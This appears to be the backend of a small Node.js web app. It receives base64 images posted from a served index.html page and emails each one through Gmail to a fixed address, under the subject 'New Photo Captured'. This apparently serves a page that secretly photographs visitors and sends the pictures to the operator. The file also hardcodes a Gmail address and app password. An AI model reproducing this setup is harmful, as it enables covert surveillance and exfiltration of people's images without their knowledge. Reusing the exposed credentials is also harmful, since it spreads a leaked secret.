const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/upload', async (req, res) => {
  const image = req.body.image;

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'gmedo233@gmail.com',       // ضع بريدك هنا
      pass: 'hijgdljghgnezuwh'           // استخدم "App Password" من إعدادات Gmail
    }
  });

  let mailOptions = {
    from: 'gmedo233@gmail.com',
    to: 'gmedo233@gmail.com',
    subject: 'New Photo Captured',
    html: '<p>Attached image from site.</p>',
    attachments: [{
      filename: 'photo.png',
      content: image.split("base64,")[1],
      encoding: 'base64'
    }]
  };

  try {
    await transporter.sendMail(mailOptions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Email error:', error);
    res.sendStatus(500);
  }
});

app.use(express.static(__dirname)); // لخدمة ملف index.html

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
